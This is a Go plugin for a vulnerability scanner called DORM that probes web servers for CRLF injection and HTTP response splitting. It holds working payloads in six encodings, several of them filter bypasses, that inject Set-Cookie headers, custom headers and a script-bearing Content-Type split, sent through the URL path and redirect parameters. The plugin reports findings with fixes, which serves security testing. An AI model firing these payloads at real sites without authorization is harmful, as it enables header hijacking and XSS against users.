package plugins

import (
	"DORM/models"
	"fmt"
	"net/url"
	"strings"
)

// ==================================================
// CRLF INJECTION — v2.0 "Header Hijack"
// 6 encoding variants · XSS escalation
// Response splitting proof · Spider integration
// ==================================================
type CRLFPlugin struct{}

func (p *CRLFPlugin) Name() string { return "CRLF Injection (Header Hijack v2)" }

func (p *CRLFPlugin) Run(target models.ScanTarget) *models.Vulnerability {
	if !isWebPort(target.Port) {
		return nil
	}

	client := models.GetClient()
	baseURL := getURL(target, "")

	// ── CRLF encoding variants ────────────────────────────────────────
	type CRLFVariant struct {
		Encoded string // URL embedded form
		Name    string
	}

	// Each variant: Set-Cookie header injection proof
	headerCanary := "X-DORM-Injected"
	cookieCanary := "DORM_CRLF_PWN"

	crlfs := []CRLFVariant{
		{"%0d%0a", "Standard (%0d%0a)"},
		{"%0D%0A", "Uppercase (%0D%0A)"},
		{"%E5%98%8D%E5%98%8A", "Unicode Multi-Byte Bypass"},
		{"%u000d%u000a", "IIS Unicode Bypass"},
		{"%23%0d%0a", "Hash Prefix Bypass"},
		{"%%0d%%0a", "Double Percent Bypass"},
	}

	// ── Injection points ──────────────────────────────────────────────
	// 1. URL path — direct embedding to path
	// 2. Redirect/open-redirect parametreleri
	redirectParams := []string{"redirect", "url", "next", "return", "dest", "target", "redir", "goto", "r", "u"}

	// ── Injection string'leri ────────────────────────────────────────────
	buildPathPayload := func(crlf string) string {
		// /path\r\nSet-Cookie: DORM_CRLF_PWN=1
		return fmt.Sprintf("/%sSet-Cookie: %s=1", crlf, cookieCanary)
	}

	buildParamPayload := func(crlf string) string {
		// http://example.com\r\nSet-Cookie: DORM_CRLF_PWN=1
		return fmt.Sprintf("http://example.com%sSet-Cookie: %s=1", crlf, cookieCanary)
	}

	buildXSSPayload := func(crlf string) string {
		// \r\nContent-Type: text/html\r\n\r\n<script>alert('DORM_XSS')</script>
		return fmt.Sprintf("/%sContent-Type: text/html%s%s<script>alert('DORM_XSS_CRLF')</script>", crlf, crlf, crlf)
	}

	buildHeaderPayload := func(crlf string) string {
		return fmt.Sprintf("/%s%s: dorm_injected", crlf, headerCanary)
	}

	checkCookie := func(resp interface{ Header() map[string][]string }) bool {
		// Helper: Is there a canary in the Set-Cookie header?
		return false // we use net/http.Response directly instead of interface trick
	}
	_ = checkCookie

	// ── PHASE 1: URL Path Injection ───────────────────────────────────────
	for _, variant := range crlfs {
		// Response splitting — Set-Cookie proof
		pathPayload := buildPathPayload(variant.Encoded)
		resp, err := client.Get(baseURL + pathPayload)
		if err == nil {
			defer resp.Body.Close()
			setCookie := resp.Header.Get("Set-Cookie")
			if strings.Contains(setCookie, cookieCanary) {
				return &models.Vulnerability{
					Target:   target,
					Name:     "CRLF Injection (Response Splitting)",
					Severity: "MEDIUM",
					CVSS:     6.5,
					Description: fmt.Sprintf(
						"HTTP response splitting was confirmed via CRLF injection.\nEncoding: %s\nPayload: %s\nProof: '%s' was found in the Set-Cookie header.",
						variant.Name, pathPayload, cookieCanary,
					),
					Solution:  "Encode or filter \\r\\n characters in user inputs.",
					Reference: "CWE-113: HTTP Response Splitting",
				}
			}

			// Custom header proof
			if resp.Header.Get(headerCanary) != "" {
				return &models.Vulnerability{
					Target:   target,
					Name:     fmt.Sprintf("CRLF Injection (Header Injection — %s)", variant.Name),
					Severity: "MEDIUM",
					CVSS:     6.8,
					Description: fmt.Sprintf(
						"Custom header was injected.\nEncoding: %s\nInjected Header: '%s: dorm_injected'",
						variant.Name, headerCanary,
					),
					Solution:  "Filter or encode \\r\\n characters.",
					Reference: "CWE-113: HTTP Response Splitting",
				}
			}
		}

		// XSS escalation payload
		xssPayload := buildXSSPayload(variant.Encoded)
		respXSS, err := client.Get(baseURL + xssPayload)
		if err == nil {
			defer respXSS.Body.Close()
			ct := respXSS.Header.Get("Content-Type")
			if strings.Contains(ct, "text/html") && respXSS.StatusCode == 200 {
				return &models.Vulnerability{
					Target:   target,
					Name:     "CRLF Injection (XSS Escalation via Response Splitting)",
					Severity: "HIGH",
					CVSS:     7.5,
					Description: fmt.Sprintf(
						"Content-Type: text/html was injected via CRLF injection — XSS escalation vector confirmed.\nEncoding: %s\nPayload: %s",
						variant.Name, xssPayload,
					),
					Solution:  "Filter \\r\\n characters in all HTTP header values. Implement Content Security Policy (CSP).",
					Reference: "CWE-113 / CWE-79: XSS via CRLF Injection",
				}
			}
		}
	}

	// ── PHASE 2: Redirect Parameter Injection ─────────────────────────────
	for _, param := range redirectParams {
		for _, variant := range crlfs {
			paramPayload := buildParamPayload(variant.Encoded)
			targetURL := fmt.Sprintf("%s/?%s=%s", baseURL, param, url.QueryEscape(paramPayload))

			resp, err := client.Get(targetURL)
			if err != nil {
				continue
			}
			resp.Body.Close()

			setCookie := resp.Header.Get("Set-Cookie")
			location := resp.Header.Get("Location")

			if strings.Contains(setCookie, cookieCanary) {
				return &models.Vulnerability{
					Target:   target,
					Name:     fmt.Sprintf("CRLF Injection (Response Splitting — %s)", variant.Name),
					Severity: "MEDIUM",
					CVSS:     6.5,
					Description: fmt.Sprintf(
						"CRLF injection was confirmed via redirect parameter.\nParam: %s  Encoding: %s\nPayload: %s\nProof: '%s' was found in Set-Cookie.",
						param, variant.Name, paramPayload, cookieCanary,
					),
					Solution:  "Validate redirect URLs against a whitelist and encode \\r\\n characters.",
					Reference: "CWE-113: HTTP Response Splitting",
				}
			}

			if strings.Contains(location, "\r") || strings.Contains(location, "\n") {
				return &models.Vulnerability{
					Target:   target,
					Name:     fmt.Sprintf("CRLF Injection (Location Header Split — %s)", variant.Name),
					Severity: "MEDIUM",
					CVSS:     6.8,
					Description: fmt.Sprintf(
						"Location header contains CRLF characters - response splitting proved.\nParam: %s  Encoding: %s",
						param, variant.Name,
					),
					Solution:  "Validate redirect URLs and filter \\r\\n characters.",
					Reference: "CWE-113: HTTP Response Splitting",
				}
			}
		}
	}

	// ── PHASE 3: Spider Endpoint Integration ─────────────────────────────
	key := "endpoints_" + target.IP
	if existing, ok := models.SharedData.Load(key); ok {
		spiderEndpoints := existing.([]models.Endpoint)
		for _, ep := range spiderEndpoints {
			if ep.Method == "GET" && len(ep.Params) > 0 {
				for _, param := range ep.Params {
					// Does it look like a redirect parameter?
					if !containsAny(strings.ToLower(param), "redirect", "url", "next", "return", "dest", "goto", "r", "u") {
						continue
					}
					for _, variant := range crlfs[:2] { // First 2 encodings are sufficient
						u, err := url.Parse(ep.URL)
						if err != nil {
							continue
						}
						q := u.Query()
						q.Set(param, buildParamPayload(variant.Encoded))
						u.RawQuery = q.Encode()

						resp, err := client.Get(u.String())
						if err != nil {
							continue
						}
						resp.Body.Close()

						if strings.Contains(resp.Header.Get("Set-Cookie"), cookieCanary) {
							return &models.Vulnerability{
								Target:   target,
								Name:     "CRLF Injection (Spider-Discovered Endpoint)",
								Severity: "MEDIUM",
								CVSS:     6.5,
								Description: fmt.Sprintf(
									"CRLF injection was confirmed on spider-discovered endpoint.\nURL: %s\nParam: %s  Encoding: %s",
									ep.URL, param, variant.Name,
								),
								Solution:  "Filter \\r\\n characters in all parameters.",
								Reference: "CWE-113: HTTP Response Splitting",
							}
						}
					}
				}
			}
		}
	}

	// ── Final check: standard path payload (header proof) ─────────────────
	for _, variant := range crlfs {
		hdrPayload := buildHeaderPayload(variant.Encoded)
		resp, err := client.Get(baseURL + hdrPayload)
		if err != nil {
			continue
		}
		resp.Body.Close()
		if resp.Header.Get(headerCanary) != "" {
			return &models.Vulnerability{
				Target:   target,
				Name:     fmt.Sprintf("CRLF Injection (Unicode Bypass — %s)", variant.Name),
				Severity: "MEDIUM",
				CVSS:     6.8,
				Description: fmt.Sprintf(
					"CRLF injection bypass succeeded with Unicode/special encoding.\nEncoding: %s\nInjected Header: '%s'",
					variant.Name, headerCanary,
				),
				Solution:  "Filter all encoding variants (hex, unicode, double-encode).",
				Reference: "CWE-113: HTTP Response Splitting",
			}
		}
	}

	return nil
}
